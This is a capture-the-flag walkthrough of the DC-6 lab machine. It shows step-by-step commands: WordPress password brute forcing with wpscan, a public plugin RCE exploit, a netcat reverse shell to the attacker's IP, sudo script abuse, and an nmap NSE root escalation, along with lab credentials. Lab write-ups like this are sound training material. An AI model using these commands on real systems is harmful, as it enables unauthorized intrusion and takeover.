# DC-6 Walkthrough

**Credits:**

**Rejaul Islam**  
_Security enthusiast_

............................................

## 1. Reconnaissance – Finding the Target

Like always, the first step is to **find the target IP** and scan for open ports.

```bash
sudo netdiscover
rustscan -a <ip_address>
nmap -sC -sV -n -v -p <port_here> <ip_address>
```

👉 On DC-6, only **22 (SSH)** and **80 (HTTP)** were open.

---

## 2. Web Enumeration

When I visited the IP `http://192.168.0.141`, nothing useful showed up.
That usually means we need to set up a **virtual host** mapping.

```bash
sudo nano /etc/hosts
192.168.0.141    wordy
```

Now visiting `http://wordy` works.
The site looks normal, but after scanning with **Nikto** I got something interesting:

```bash
nikto -h http://192.168.0.141
```

**Result:**

```
+ /wp-login.php: Wordpress login found.
```

✅ So this machine is running WordPress.

---

## 3. WordPress Enumeration

We know `wpscan` is the go-to tool for WordPress. First, I looked for usernames:

```bash
wpscan --url http://wordy --enumerate u --api-token <Your_Token>
```

**Found users:**

```
admin, graham, mark, sarah, jens
```

Now, brute-force the password:

```bash
wpscan --url http://wordy -U users.txt -P passwords.txt --api-token <Your_Token>
```

**Result:**

```
mark:helpdesk01
```

👉 We now have credentials for **mark**.

---

## 4. Getting Initial Access

Login to WordPress as `mark`.
Inside the dashboard, I noticed a plugin: **Activity Monitor**.

A quick search showed it has a known RCE exploit:

```bash
searchsploit activity monitor
```

**Result:**

```
Activity Monitor 20161228 - Remote Code Execution (RCE) | php/webapps/50110.py
```

Copy the exploit locally:

```bash
searchsploit -m php/webapps/50110.py
chmod +x 50110.py
python3 50110.py
```

The exploit asks for:

```
ip = <target_ip>
user = mark
password = helpdesk01
```

Then I set up a **listener** on my machine:

```bash
nc -lnvp 1212
```

Back in the exploit terminal, I used reverse shell command:

```bash
nc -e /bin/bash <your_ip> 1212
```

✅ I got a shell!

Make it stable:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 5. Privilege Escalation – User Enumeration

I checked the home directories and found 4 users.
In **mark**’s folder → a hint file.
In **jens**’ folder → a backup file.
Also found creds inside mark’s files:

```
graham:GSo7isUM1D4
```

Switch to user **graham** via SSH or shell.

---

## 6. Escalating Graham → Jens

Check sudo privileges:

```bash
sudo -l
```

**Result:**

```
User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

That means Graham can run **backups.sh** as **jens** without a password.
So I appended a malicious line:

```bash
echo "/bin/bash" >> /home/jens/backups.sh
sudo -u jens /home/jens/backups.sh
```

✅ Now I am **jens**.

---

## 7. Escalating Jens → Root

Check sudo privileges again:

```bash
sudo -l
```

**Result:**

```
User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

We know **Nmap** can be abused for privilege escalation.

First, I tried interactive shell:

```bash
sudo /usr/bin/nmap --interactive
nmap> !sh
```

But it didn’t work.
So I made a malicious NSE script:

```bash
cd /var/tmp
echo "os.execute('/bin/bash')" > hacker.nse
sudo /usr/bin/nmap --script=hacker.nse
```

✅ Got root shell! 🎉

---

## 8. Capture the Flag

```bash
cd /root
ls
cat theflag.txt
```

---

# 🎯 Conclusion

- Recon with **netdiscover + rustscan + nmap**
- Found **WordPress** → brute-forced login with `wpscan`
- Exploited vulnerable plugin → got shell
- Enumerated users → found creds for `graham`
- Used **backups.sh** privilege to escalate to `jens`
- Abused **nmap sudo** to escalate to **root**

---

## Final Words

👏 Well Done! 👏
